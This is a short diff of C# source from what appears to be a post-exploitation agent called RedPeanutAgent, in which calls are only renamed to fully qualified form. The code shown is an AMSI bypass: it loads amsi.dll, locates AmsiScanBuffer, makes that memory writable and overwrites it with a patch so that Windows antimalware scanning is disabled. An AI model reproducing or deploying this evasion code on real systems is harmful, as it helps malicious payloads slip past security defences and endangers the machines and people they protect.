@@ -61,15 +61,15 @@ namespace RedPeanutAgent.Core
         {
             try
             {
-                var lib = Natives.LoadLibrary("amsi.dll");
-                var addr = Natives.GetProcAddress(lib, "AmsiScanBuffer");
+                var lib = RedPeanutAgent.Core.Natives.LoadLibrary("amsi.dll");
+                var addr = RedPeanutAgent.Core.Natives.GetProcAddress(lib, "AmsiScanBuffer");
 
                 uint oldProtect;
-                Natives.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                RedPeanutAgent.Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
 
                 Marshal.Copy(patch, 0, addr, patch.Length);
 
-                Natives.VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+                RedPeanutAgent.Core.Natives.VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
             }
             catch (Exception e)
             {
